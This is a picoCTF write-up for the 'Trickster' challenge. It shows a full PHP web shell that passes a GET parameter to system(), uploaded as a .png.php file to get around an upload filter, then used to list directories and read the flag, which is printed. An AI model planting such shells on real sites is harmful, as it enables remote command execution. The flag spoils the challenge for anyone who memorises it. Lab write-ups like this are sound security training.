# Trickster
We are given a web app which processes .png files.
URL: - `http://atlas.picoctf.net:64957/`

When we copen the web app we are directed to the web page given below.
![image](https://github.com/user-attachments/assets/493889b2-8712-4a9a-bb11-3a45037635e2)

The source code is given below:-
```bash
<!DOCTYPE html>
<html>
<head>
    <title>File Upload Page</title>
</head>
<body>
    <h1>Welcome to my PNG processing app</h1>

    
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" accept=".png">
        <input type="submit" value="Upload File">
    </form>
</body>
</html>
```

Initially I tried uploading a .png file to see how it responds.
![image](https://github.com/user-attachments/assets/8340a272-c4ae-400c-99d4-ff3af3036bc0)

to check which type of format it is, we have to add index.html or index.php as these are generally the default pages shown.
![image](https://github.com/user-attachments/assets/fbe5a567-99a5-441d-b985-9c81390ea71f)
in the above image we can see it is not HTML.

Rather than it is PHP.
![image](https://github.com/user-attachments/assets/40544d77-b044-417f-a651-75c7617d9d15)

After figuring that out we can the following web pages to get more hints: -
1.) /instructions.txt
2.) /robots.txt

On checking /instructions.txt
![image](https://github.com/user-attachments/assets/21580aa8-518f-4656-8759-fac5a8fa4b88)

On checking /robots.txt
![image](https://github.com/user-attachments/assets/71128b85-8b0e-4914-879e-ec3cf72789e4)

We can see that a folder has benn mentioned here. /uploads/
After that we can try uploading a text file containing a php webshell.
This might let us access the web shell where we can execute commands.
```bash
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

After uploads the file, we will go the webpage /uploads/FILE.png.php (FILE.png.php is the file where the php webshell is saved).
![image](https://github.com/user-attachments/assets/82bff245-1096-4282-9dd3-ce3d6c8e092a)

We now have the webshell where we can execute commands.
I used `ls -l` command to get the file permissions
![image](https://github.com/user-attachments/assets/5392faa4-2990-446a-8d60-aa5fb77cf4a0)

Further i used the command `ls -l` on the the directory `/var/www/html`, where is a root directory for all the web content.
![image](https://github.com/user-attachments/assets/d219d70e-953e-4b52-a4ed-baa87895eeff)

Here we can see that a suspicious file is present. Now we use `cat` command to read the file.
![image](https://github.com/user-attachments/assets/e130ede9-92a8-42e3-b124-c62db7e3070a)

Flag: - `picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}`.

This is how I solved it.
